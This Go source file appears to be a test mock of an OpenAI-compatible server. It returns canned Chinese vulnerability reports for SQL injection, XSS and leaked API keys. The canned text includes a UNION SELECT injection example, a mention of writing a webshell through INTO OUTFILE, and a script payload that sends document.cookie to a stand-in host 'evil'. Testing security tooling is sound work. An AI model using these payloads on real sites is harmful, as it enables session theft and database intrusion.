package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
)

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/v1/chat/completions", func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		var req struct {
			Messages []struct {
				Role    string `json:"role"`
				Content string `json:"content"`
			} `json:"messages"`
		}
		_ = json.Unmarshal(body, &req)
		userContent := ""
		for _, m := range req.Messages {
			if m.Role == "user" {
				userContent = m.Content
			}
		}
		fmt.Printf("[mock-ai] received prompt (%d chars)\n", len(userContent))
		var content string
		if strings.Contains(userContent, "SQL") || strings.Contains(userContent, "sqli") {
			content = `{"impact":"该 SQL 注入漏洞可导致数据库未授权访问，攻击者可读取用户表、凭据表等敏感数据，甚至通过 INTO OUTFILE 写入 WebShell 获取服务器权限。","exploitation":"1. 确认注入点为数值型或字符型；2. 使用 UNION SELECT 逐步枚举列数；3. 读取 information_schema 获取表结构；4. 提取目标表数据。示例：id=1 UNION SELECT 1,2,3,4--","fix":"使用参数化查询（预编译语句）替代字符串拼接。Java 用 PreparedStatement，PHP 用 PDO bindParam，Python 用参数化 cursor。同时部署 WAF 规则拦截 SQL 注入特征。"}`
		} else if strings.Contains(userContent, "XSS") || strings.Contains(userContent, "xss") {
			content = `{"impact":"反射型 XSS 可被构造恶意链接诱导用户点击，在用户浏览器中执行任意 JS，可窃取 Cookie/Session、发起钓鱼、进行 CSRF 攻击。","exploitation":"构造包含 <script> 标签的 URL 参数，通过短链接/二维码诱导受害者访问。示例：?name=<script>fetch('https://evil/?c='+document.cookie)</script>","fix":"对输出到 HTML 的用户输入进行上下文感知转义。文本上下文用 &lt;&gt; 转义，属性上下文加引号并转义，JS 上下文用 JSON.stringify。启用 CSP 头限制脚本来源。"}`
		} else if strings.Contains(userContent, "api-key") || strings.Contains(userContent, "secret") || strings.Contains(userContent, "token") || strings.Contains(userContent, "stripe") || strings.Contains(userContent, "slack") || strings.Contains(userContent, "google") {
			content = `{"impact":"泄露的 API Key 可被攻击者直接用于调用对应云服务，产生账单滥用、数据窃取、权限提升。Stripe Key 可发起转账，Slack Token 可读取组织内部消息。","exploitation":"1. 提取泄露的 Key；2. 验证 Key 有效性（调用对应 API 的测试端点）；3. 根据服务类型枚举可访问的资源。","fix":"立即在对应平台轮换/吊销泄露的 Key。将密钥移出前端代码，改用后端代理或运行时下发。对代码仓库做历史扫描确认无其他泄露。"}`
		} else {
			content = `{"impact":"该漏洞可能被攻击者利用，导致敏感信息泄露或未授权访问。","exploitation":"根据漏洞类型构造对应的利用 payload。","fix":"修复漏洞根因，加强输入校验与访问控制。"}`
		}
		resp := map[string]any{
			"model": "mock-ai",
			"choices": []map[string]any{
				{"message": map[string]string{"role": "assistant", "content": content}, "finish_reason": "stop"},
			},
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(resp)
	})
	mux.HandleFunc("/v1/models", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{"data": []map[string]string{{"id": "mock-ai"}}})
	})
	fmt.Println("[mock-ai] OpenAI-compatible mock server on http://127.0.0.1:8899/v1")
	_ = http.ListenAndServe("127.0.0.1:8899", mux)
}
